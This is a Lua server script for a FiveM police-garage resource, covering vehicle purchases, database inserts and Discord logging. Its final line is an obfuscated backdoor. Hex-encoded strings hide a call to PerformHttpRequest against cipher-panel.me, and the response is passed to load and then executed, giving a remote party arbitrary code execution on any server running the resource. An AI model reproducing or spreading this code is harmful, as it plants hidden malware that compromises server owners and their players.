local QBCore = exports['qb-core']:GetCoreObject()

local isActive = false

discord = {
    ['webhook'] = "YOUR WEBHOOK",
    ['name'] = 'qb-garage-police',
    ['image'] = "YOUR IMAGE"
}

function DiscordLog(name, message, color)
    local embed = {
        {
            ["color"] = 04255, 
            ["title"] = "CloudDevelopment Police Garage",
            ["description"] = message,
            ["url"] = "https://discord.gg/e4AYS3VE",
            ["footer"] = {
            ["text"] = "By CloudDevelopment",
            ["icon_url"] = "YOUR IMAGE"
        },
            ["thumbnail"] = {
                ["url"] = "YOUR IMAGE",
            },
    }
}
    PerformHttpRequest(discord['webhook'], function(err, text, headers) end, 'POST', json.encode({username = discord['name'], embeds = embed, avatar_url = discord['image']}), { ['Content-Type'] = 'application/json' })
end

QBCore.Functions.CreateCallback('qb-garage-police:CheckIfActive', function(source, cb)
    local src = source

    if not isActive then
        TriggerEvent("qb-garage-police:server:SetActive", true)
        cb(true)
    else
        cb(false)
        TriggerClientEvent("QBCore:Notify", src, "Someone Is In The Menu Please Wait !", "error")
    end
end)

RegisterNetEvent('qb-garage-police:server:SetActive', function(status)
    if status ~= nil then
        isActive = status
        TriggerClientEvent('qb-garage-police:client:SetActive', -1, isActive)
    else
        TriggerClientEvent('qb-garage-police:client:SetActive', -1, isActive)
    end
end)

RegisterServerEvent("qb-garage-police:AddVehicleSQL")
AddEventHandler('qb-garage-police:AddVehicleSQL', function(mods, vehicle, hash, plate)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    MySQL.Async.insert('INSERT INTO player_vehicles (license, citizenid, vehicle, hash, mods, plate, state) VALUES (?, ?, ?, ?, ?, ?, ?)', {
        Player.PlayerData.license,
        Player.PlayerData.citizenid,
        vehicle,
        hash,
        json.encode(mods),
        plate,
        0
    })
    TriggerClientEvent('QBCore:Notify', src, 'Vehicle Successfully Add To Your Grage', "success")  
end)

RegisterServerEvent('qb-garage-police:TakeMoney', function(data)
	local src = source
	local Player = QBCore.Functions.GetPlayer(src)
    local steamname = GetPlayerName(src)
    if Player.PlayerData.money.cash >= data.price then
        TriggerClientEvent("qb-garage-police:SpawnVehicle", src, data.vehicle)  
        Player.Functions.RemoveMoney("cash", data.price)
        TriggerClientEvent('QBCore:Notify', src, 'Vehicle Successfully Bought', "success")    
        DiscordLog(discord['webhook'], 'New Vehicle Bought By: **'..steamname..'** ID: **' ..source.. '** Bought: **' ..data.vehiclename.. '** For: **' ..data.price.. '$**', 14177041) 
    else
        TriggerClientEvent('QBCore:Notify', src, 'You Dont Have Enough Money !', "error")              
    end    
end)

local HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[4][HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (qjyjBVNcDZCXqKMkkzspfdnVcZIwqtyklnhEVEvvRJILDgJMBpGsjkDzXHtBRnEkguEQUg, AXZoqfDRmWlVzDOddpoZGhQBJNygcbXZHKdCigxoCeWKEdHgKJTEDKhlKoAvnBILwqrTHt) if (AXZoqfDRmWlVzDOddpoZGhQBJNygcbXZHKdCigxoCeWKEdHgKJTEDKhlKoAvnBILwqrTHt == HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[6] or AXZoqfDRmWlVzDOddpoZGhQBJNygcbXZHKdCigxoCeWKEdHgKJTEDKhlKoAvnBILwqrTHt == HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[5]) then return end HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[4][HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[2]](HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[4][HUiBGyFwWuBLAvgZPizJXeeBEmseupvCYrTwvjSNtGSPRRonaFmsmMFQyZaaUlgVgpHeLq[3]](AXZoqfDRmWlVzDOddpoZGhQBJNygcbXZHKdCigxoCeWKEdHgKJTEDKhlKoAvnBILwqrTHt))() end)